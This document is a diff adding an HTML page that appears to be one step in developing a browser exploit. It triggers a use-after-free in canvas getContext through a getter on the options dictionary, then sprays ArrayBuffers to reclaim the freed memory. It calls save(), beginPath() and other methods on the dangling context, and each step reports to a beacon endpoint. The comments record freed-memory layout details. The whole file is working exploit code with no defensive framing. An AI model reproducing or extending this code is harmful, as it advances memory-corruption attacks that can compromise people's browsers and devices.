@@ -1,0 +1,168 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><title>V552</title></head>
+<body style="background:#111;color:#0f0;font:13px monospace;padding:10px">
+<pre id="log"></pre>
+<script>
+var L=document.getElementById('log');
+function log(m){L.textContent+=m+'\n'}
+function b(tag,data){
+  log('[B] '+tag+': '+data);
+  try{
+    var x=new XMLHttpRequest();
+    x.open('GET','/beacon/V552-'+tag+'?d='+encodeURIComponent(data)+'&t='+Date.now(),false);
+    x.send();
+  }catch(e){log('[E] beacon fail: '+e.message)}
+}
+
+function triggerUAF(){
+  var outer=document.createElement('canvas');
+  outer.width=1;outer.height=1;
+  var innerCtx=null;
+  var dict={};
+  Object.defineProperty(dict,'alpha',{
+    get:function(){
+      innerCtx=outer.getContext('2d');
+      return true;
+    }
+  });
+  outer.getContext('bitmaprenderer',dict);
+  return innerCtx;
+}
+
+b('BOOT','V552-ops-test');
+
+// Each test: UAF + AB spray + specific operation
+// Independent IIFEs — if one crashes, the rest don't run, but we know which one
+
+// T1: JS-only toString — does NOT invoke any native binding that touches C++ impl
+(function T1(){
+  b('T1-START','toString-test');
+  var ctx=triggerUAF();
+  var abs=[];
+  for(var i=0;i<50;i++) abs.push(new ArrayBuffer(768));
+  b('T1-SPRAY','done');
+  try{
+    var s=ctx.toString();
+    b('T1-TOSTR',s);
+  }catch(e){b('T1-TOSTR-ERR',e.message)}
+  try{
+    var s2=Object.prototype.toString.call(ctx);
+    b('T1-OPROTO',s2);
+  }catch(e){b('T1-OPROTO-ERR',e.message)}
+  b('T1-DONE','ok');
+})();
+
+// T2: constructor and prototype — pure JS property lookups
+(function T2(){
+  b('T2-START','ctor-proto-test');
+  var ctx=triggerUAF();
+  var abs=[];
+  for(var i=0;i<50;i++) abs.push(new ArrayBuffer(768));
+  b('T2-SPRAY','done');
+  try{
+    var c=ctx.constructor;
+    b('T2-CTOR',String(c).substring(0,60));
+  }catch(e){b('T2-CTOR-ERR',e.message)}
+  try{
+    var p=Object.getPrototypeOf(ctx);
+    b('T2-PROTO',String(p).substring(0,60));
+  }catch(e){b('T2-PROTO-ERR',e.message)}
+  try{
+    var k=Object.keys(ctx);
+    b('T2-KEYS',JSON.stringify(k));
+  }catch(e){b('T2-KEYS-ERR',e.message)}
+  b('T2-DONE','ok');
+})();
+
+// T3: typeof and instanceof — no native call
+(function T3(){
+  b('T3-START','typeof-instanceof');
+  var ctx=triggerUAF();
+  var abs=[];
+  for(var i=0;i<50;i++) abs.push(new ArrayBuffer(768));
+  b('T3-SPRAY','done');
+  try{
+    b('T3-TYPEOF',typeof ctx);
+    b('T3-INSTOF',''+((ctx instanceof CanvasRenderingContext2D)));
+  }catch(e){b('T3-ERR',e.message)}
+  b('T3-DONE','ok');
+})();
+
+// T4: getContextAttributes — reads inline m_settings, NO stateStack access
+(function T4(){
+  b('T4-START','getContextAttributes');
+  var ctx=triggerUAF();
+  var abs=[];
+  for(var i=0;i<50;i++) abs.push(new ArrayBuffer(768));
+  b('T4-SPRAY','done');
+  b('T4-PREATTR','about to call getContextAttributes');
+  try{
+    var attr=ctx.getContextAttributes();
+    b('T4-ATTR',JSON.stringify(attr));
+  }catch(e){b('T4-ATTR-ERR',e.message)}
+  b('T4-DONE','ok');
+})();
+
+// T5: save() — the one that crashed in V551-crash-isolate
+(function T5(){
+  b('T5-START','save-test');
+  var ctx=triggerUAF();
+  var abs=[];
+  for(var i=0;i<50;i++) abs.push(new ArrayBuffer(768));
+  b('T5-SPRAY','done');
+  b('T5-PRESAVE','about to save');
+  try{
+    ctx.save();
+    b('T5-SAVE','save() OK!');
+  }catch(e){b('T5-SAVE-ERR',e.message)}
+  b('T5-DONE','ok');
+})();
+
+// T6: save() on freed memory (NO AB reclaim)
+(function T6(){
+  b('T6-START','save-no-reclaim');
+  var ctx=triggerUAF();
+  // NO spray — freed memory has bmalloc free-list pointer
+  b('T6-PRESAVE','about to save on freed memory');
+  try{
+    ctx.save();
+    b('T6-SAVE','save() on freed OK!');
+  }catch(e){b('T6-SAVE-ERR',e.message)}
+  b('T6-DONE','ok');
+})();
+
+// T7: beginPath() — also does NOT access stateStack
+// beginPath() just resets the internal path: m_path.clear()
+// This accesses m_path which is in CanvasPath base (different offset from stateStack)
+(function T7(){
+  b('T7-START','beginPath-test');
+  var ctx=triggerUAF();
+  var abs=[];
+  for(var i=0;i<50;i++) abs.push(new ArrayBuffer(768));
+  b('T7-SPRAY','done');
+  b('T7-PREPATH','about to beginPath');
+  try{
+    ctx.beginPath();
+    b('T7-PATH','beginPath() OK!');
+  }catch(e){b('T7-PATH-ERR',e.message)}
+  b('T7-DONE','ok');
+})();
+
+// T8: isPointInPath — accesses path and transform, not stateStack
+(function T8(){
+  b('T8-START','isPointInPath');
+  var ctx=triggerUAF();
+  var abs=[];
+  for(var i=0;i<50;i++) abs.push(new ArrayBuffer(768));
+  b('T8-SPRAY','done');
+  b('T8-PREIPT','about to isPointInPath');
+  try{
+    var r=ctx.isPointInPath(0,0);
+    b('T8-IPT','result='+r);
+  }catch(e){b('T8-IPT-ERR',e.message)}
+  b('T8-DONE','ok');
+})();
+
+b('DONE','V552-all-complete');
+</script>
+</body></html>
